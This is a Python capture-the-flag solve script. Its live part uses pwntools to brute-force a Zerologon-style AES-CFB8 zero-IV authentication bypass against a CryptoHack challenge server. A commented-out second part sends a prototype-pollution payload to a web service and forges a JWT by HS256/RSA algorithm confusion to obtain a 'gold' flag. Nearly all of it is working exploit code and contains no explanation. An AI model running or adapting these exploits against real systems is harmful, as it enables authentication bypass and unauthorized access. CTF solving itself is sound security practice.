from pwn import * 
import json 

# https://www.secura.com/uploads/whitepapers/Zerologon.pdf

io = remote('socket.cryptohack.org', 13399, level = 'debug')
io.recvline()

iv = b'0' * 16 
password = "0" * 16
ct = iv + password.encode()

reset_conn = dict()
reset_conn['option'] = 'reset_connection'

reset_pass = dict()
reset_pass['option'] = 'reset_password'
reset_pass['token'] = ct.hex()

auth = dict()
auth['option'] = 'authenticate'
auth['password'] = '0' * 12 

while True:
    io.sendline(json.dumps(reset_pass).encode())
    io.recvline()

    io.sendline(json.dumps(auth).encode())
    status = json.loads(io.recvline().decode())['msg']
    if "flag" in status: 
        print(status)
        break
    
    io.sendline(json.dumps(reset_conn).encode())
    io.recvline()


# import requests
# import json
# import jwt

# url = "http://34.105.202.19:3000"

# def get_token(i):
#     payload = {
#         "firstName": "Stupid",
#         "lastName": "Idiot",
#         "passport": 123456789,
#         "ffp": f"CA1234567{i}",
#         "extras": {"x": {"sssr": "FQTU"}, 'constructor': {'name':'Array'}}
#     }

#     res = requests.post(f"{url}/checkin", json=payload).json()
#     return res["token"]


# def get_flag():
#     # This is the RSA public key I calculated
#     key = """-----BEGIN PUBLIC KEY-----
# MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw5lfZkrAzBjl2uf2bF4q
# uWzPbmEzcsjVGwEePrj3tQh2gQWMw7HOvNNqVMWbuyK0VYWyk/EJ2IXkrV+R7yz1
# ROFf2gMH6MRcdVakQF0MQJVRGOmwAIxi+Y7X3fo8HsjJVzzEk4Xy+nWTGS/FuNSW
# +n0ch81nlZykurVcDKTS7zxPjOtkOswfypoqZyEJ8Uyn32VgWcZ1IK4CB1m9Za0j
# DLU30ohyT3e3GUWT+qkUSiaHtMTViq8CxSMzlfFC1ASmAT1wGE+/rcUtTPvVKmh0
# fTO2sqEsCQp2MGzKk8K1IhwdvuaXqgOFGIcBbaqMwKjpXIfTJSIb7rwEy/i3N9y8
# CwIDAQAB
# -----END PUBLIC KEY-----
# """

#     # Requires a small patch to PyJWT
#     token = jwt.encode({"status": "gold"}, key, algorithm="HS256")

#     headers = {"Authorization": f"Bearer {token}"}
#     res = requests.post(f"{url}/upgrades/flag", headers=headers).json()
#     print(res)


# if False:
#     t1 = get_token(0)
#     t2 = get_token(1)
#     print(t1, t2)
#     # Now get the RSA public key using
#     # https://github.com/silentsignal/rsa_sign2n/tree/release/standalone
# else:
#     get_flag()